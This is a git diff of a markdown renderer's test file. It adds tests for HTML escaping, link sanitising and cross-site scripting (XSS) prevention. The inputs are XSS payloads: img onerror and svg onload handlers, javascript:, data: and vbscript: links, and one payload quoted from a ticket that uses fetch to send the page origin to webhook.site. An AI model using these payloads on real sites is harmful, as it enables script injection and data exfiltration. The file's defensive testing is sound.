@@ -6,9 +6,11 @@ import { describe, expect, it } from "vitest";
 import {
   astToHTML,
   cleanMarkdownSyntax,
+  escapeHtml,
   extractLinkData,
   markdownToHTML,
   parseMarkdownToAST,
+  sanitizeHref,
 } from "./markdown.ts";
 
 // Load API keys from ~/.atlas/.env (no dotenv dep — parse manually)
@@ -216,7 +218,7 @@ describe("markdownToHTML", () => {
 
   it("links", () => {
     expect(markdownToHTML("[link text](https://example.com)")).toEqual(
-      '<p><a href="https://example.com" target="_blank">link text</a></p>',
+      '<p><a href="https://example.com" target="_blank" rel="noopener noreferrer">link text</a></p>',
     );
   });
 
@@ -236,7 +238,7 @@ describe("markdownToHTML", () => {
 
     const expected =
       "<p>Here is a paragraph with <strong>bold</strong> and <em>italic</em> text.</p>" +
-      '<ol><li>First item</li><li>Second item with <a href="https://example.com" target="_blank">a link</a></li></ol>';
+      '<ol><li>First item</li><li>Second item with <a href="https://example.com" target="_blank" rel="noopener noreferrer">a link</a></li></ol>';
 
     expect(markdownToHTML(markdown)).toEqual(expected);
   });
@@ -352,6 +354,149 @@ Allstate and Progressive are the strongest candidates.`;
     expect(result).toContain("Chubb");
     expect(result).toContain("Agreed Value, luxury vehicle expertise");
     expect(result).toContain("</table>");
+  });
+});
+
+describe("escapeHtml", () => {
+  it("escapes all dangerous characters", () => {
+    expect(escapeHtml('<script>alert("xss")</script>')).toEqual(
+      "&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;",
+    );
+  });
+
+  it("escapes ampersands", () => {
+    expect(escapeHtml("a & b")).toEqual("a &amp; b");
+  });
+
+  it("escapes single quotes", () => {
+    expect(escapeHtml("it's")).toEqual("it&#39;s");
+  });
+
+  it("leaves safe text unchanged", () => {
+    expect(escapeHtml("Hello world")).toEqual("Hello world");
+  });
+});
+
+describe("sanitizeHref", () => {
+  it("allows https URLs", () => {
+    expect(sanitizeHref("https://example.com")).toEqual("https://example.com");
+  });
+
+  it("allows http URLs", () => {
+    expect(sanitizeHref("http://example.com")).toEqual("http://example.com");
+  });
+
+  it("allows mailto URLs", () => {
+    expect(sanitizeHref("mailto:user@example.com")).toEqual("mailto:user@example.com");
+  });
+
+  it("allows relative URLs", () => {
+    expect(sanitizeHref("/path/to/page")).toEqual("/path/to/page");
+  });
+
+  it("allows fragment URLs", () => {
+    expect(sanitizeHref("#section")).toEqual("#section");
+  });
+
+  it("blocks javascript: URLs", () => {
+    expect(sanitizeHref("javascript:alert(1)")).toEqual("#");
+  });
+
+  it("blocks javascript: URLs case-insensitively", () => {
+    expect(sanitizeHref("JavaScript:alert(1)")).toEqual("#");
+  });
+
+  it("blocks data: URLs", () => {
+    expect(sanitizeHref("data:text/html,<script>alert(1)</script>")).toEqual("#");
+  });
+
+  it("blocks vbscript: URLs", () => {
+    expect(sanitizeHref("vbscript:alert(1)")).toEqual("#");
+  });
+
+  it("trims whitespace", () => {
+    expect(sanitizeHref("  https://example.com  ")).toEqual("https://example.com");
+  });
+});
+
+describe("XSS prevention", () => {
+  it("escapes img tag with onerror handler", () => {
+    const result = markdownToHTML('hi <img src=x onerror="alert(1)">');
+    expect(result).not.toContain("<img");
+    expect(result).toContain("&lt;img");
+  });
+
+  it("escapes svg tag with onload handler", () => {
+    const result = markdownToHTML("<svg onload=alert(1)>");
+    expect(result).not.toContain("<svg");
+    expect(result).toContain("&lt;svg");
+  });
+
+  it("escapes script tags", () => {
+    const result = markdownToHTML("<script>alert(1)</script>");
+    expect(result).not.toContain("<script>");
+    expect(result).toContain("&lt;script&gt;");
+  });
+
+  it("escapes iframe tags", () => {
+    const result = markdownToHTML('<iframe src="javascript:alert(1)">');
+    expect(result).not.toContain("<iframe");
+    expect(result).toContain("&lt;iframe");
+  });
+
+  it("blocks javascript: in markdown links", () => {
+    const result = markdownToHTML("[click](javascript:alert(1))");
+    expect(result).not.toContain("javascript:");
+    expect(result).toContain('href="#"');
+  });
+
+  it("blocks data: URLs in markdown links", () => {
+    const result = markdownToHTML("[click](data:text/html,<script>alert(1)</script>)");
+    expect(result).not.toContain("data:");
+    expect(result).toContain('href="#"');
+  });
+
+  it("escapes HTML in paragraph content", () => {
+    const result = markdownToHTML('Hello <b onmouseover="alert(1)">world</b>');
+    expect(result).not.toContain("<b ");
+    expect(result).toContain("&lt;b");
+  });
+
+  it("escapes HTML mixed with bold formatting", () => {
+    const result = markdownToHTML('**bold** <img src=x onerror="alert(1)">');
+    expect(result).toContain("<strong>bold</strong>");
+    expect(result).not.toContain("<img");
+    expect(result).toContain("&lt;img");
+  });
+
+  it("escapes HTML in list items", () => {
+    const result = markdownToHTML("- <script>alert(1)</script>\n- safe item");
+    expect(result).not.toContain("<script>");
+    expect(result).toContain("&lt;script&gt;");
+    expect(result).toContain("safe item");
+  });
+
+  it("escapes HTML in code blocks", () => {
+    const result = markdownToHTML("```\n<script>alert(1)</script>\n```");
+    expect(result).toContain("&lt;script&gt;");
+    expect(result).not.toContain("<script>alert");
+  });
+
+  it("preserves safe https links", () => {
+    const result = markdownToHTML("[safe link](https://example.com)");
+    expect(result).toContain('href="https://example.com"');
+    expect(result).toContain("safe link");
+  });
+
+  it("escapes the webhook.site exfiltration payload from the ticket", () => {
+    const payload =
+      "hi <img src=x onerror=\"fetch('https://webhook.site/id',{method:'POST',body:JSON.stringify({origin:location.origin})})\">";
+    const result = markdownToHTML(payload);
+    // The <img> tag must be escaped — no live HTML element
+    expect(result).not.toContain("<img");
+    expect(result).toContain("&lt;img");
+    // The onerror handler is rendered as escaped text, not as an executable attribute
+    expect(result).toContain("onerror=&quot;");
   });
 });
 
